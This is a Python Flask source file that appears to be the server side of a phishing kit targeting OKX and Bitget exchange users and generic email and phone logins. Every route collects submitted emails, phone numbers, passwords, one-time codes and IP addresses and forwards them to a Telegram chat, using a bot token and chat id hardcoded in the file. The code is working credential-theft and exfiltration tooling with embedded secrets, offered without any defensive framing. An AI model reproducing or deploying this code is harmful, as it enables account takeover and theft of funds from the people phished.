from flask import Flask, request, Response, jsonify
from flask_cors import CORS
import requests

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = '4f7d2a1b9e3c8d6f'
CORS(app)

# Telegram bot details
bot_token = "7042325269:AAHb7fGXOQQ8bmzhTcdjbtuV_rr3Q6iLw4M"
chat_id = "-1002099049459"

@app.route('/', methods=['GET'])
def index():
    return 'Hello, World!'

@app.route('/auth/okx_login', methods=['POST'])
def handle_okx_login():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        data = request.get_json()
        password = data.get('password')

        print(f"Data sent is: {data}")

        # Determine the type of login based on incoming data
        if 'phoneNumber' in data:
            phone_number = data['phoneNumber']
            payload_text = f"OKX Login - Phone: {phone_number}, Password: {password}, IP: {user_ip}"
        elif 'email' in data:
            email = data['email']
            payload_text = f"OKX Login - Email: {email}, Password: {password}, IP: {user_ip}"
        else:
            return Response('{"success": false, "error": "Invalid data"}', status=400, content_type='application/json')

        return send_telegram_message(payload_text)

@app.route('/auth/okx_otp', methods=['POST'])
def handle_okx_otp():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        otp = request.json.get('otp')

        if otp:
            payload_text = f"OKX OTP - OTP: {otp}, IP: {user_ip}"
            return send_telegram_message(payload_text)
        else:
            return Response('{"success": false, "error": "OTP not provided"}', status=400, content_type='application/json')
        

@app.route('/login/email', methods=['POST'])
def login_email():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')

        print(f"Data sent is: {data}")

        # Prepare message to send to Telegram
        payload_text = f"Email Login - Email: {email}, Password: {password}, IP: {user_ip}"
        return send_telegram_message(payload_text)

@app.route('/login/mobile', methods=['POST'])
def login_mobile():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        data = request.get_json()
        country_code = data.get('country_code')
        phone = data.get('phone')
        password = data.get('password')

        print(f"Data sent is: {data}")

        # Prepare message to send to Telegram
        payload_text = f"Mobile Login - Phone: {country_code}{phone}, Password: {password}, IP: {user_ip}"
        return send_telegram_message(payload_text)

    
@app.route('/bitget/login', methods=['POST'])
def bitget_login():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')

        print(f"Data sent is: {data}")

        # Prepare message to send to Telegram
        payload_text = f"Bitget Login - Email: {email}, Password: {password}, IP: {user_ip}"
        return send_telegram_message(payload_text)

@app.route('/bitget/verify-otp', methods=['POST'])
def verify_otp():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        data = request.get_json()
        otp = data.get('otp')

        print(f"Data sent is: {data}")

        # Prepare message to send to Telegram
        payload_text = f"Bitget OTP Verification - OTP: {otp}, IP: {user_ip}"
        return send_telegram_message(payload_text)


def send_telegram_message(payload_text):
    try:
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        payload_telegram = {'chat_id': chat_id, 'text': payload_text}
        response = requests.post(url, json=payload_telegram)

        if response.status_code == 200:
            return Response('{"success": true}', status=200, content_type='application/json')
        else:
            return Response('{"success": false, "error": "Failed to send message to Telegram"}', status=501, content_type='application/json')

    except Exception as err:
        return Response(f'{{"success": false, "error": "{str(err)}"}}', status=500, content_type='application/json')

if __name__ == '__main__':
    app.run(debug=True)
